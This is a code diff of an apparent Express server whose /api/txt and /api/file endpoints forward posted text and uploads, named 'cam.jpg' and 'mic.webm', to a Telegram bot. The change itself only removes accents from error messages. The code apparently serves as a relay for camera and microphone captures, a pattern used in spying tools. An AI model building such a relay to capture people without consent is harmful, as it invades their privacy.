@@ -40,7 +40,7 @@ app.get("/api/ping", async (req, res) => {
 app.post("/api/txt", express.json({ limit: "1mb" }), async (req, res) => {
   try {
     const t = (req.body && req.body.text) || "";
-    if (!t) throw new Error("texto vacío");
+    if (!t) throw new Error("texto vacio");
     console.log("TXT", t.length);
     const r = await fetch(tg("sendMessage"), {
       method: "POST",
@@ -58,7 +58,7 @@ app.post("/api/txt", express.json({ limit: "1mb" }), async (req, res) => {
 
 app.post("/api/file", express.raw({ type: "*/*", limit: "10mb" }), async (req, res) => {
   try {
-    if (!req.body || !req.body.length) throw new Error("archivo vacío");
+    if (!req.body || !req.body.length) throw new Error("archivo vacio");
     const tipo = req.query.tipo === "doc" ? "sendDocument" : "sendPhoto";
     const campo = tipo === "sendPhoto" ? "photo" : "document";
     const nombre = tipo === "sendPhoto" ? "cam.jpg" : "mic.webm";
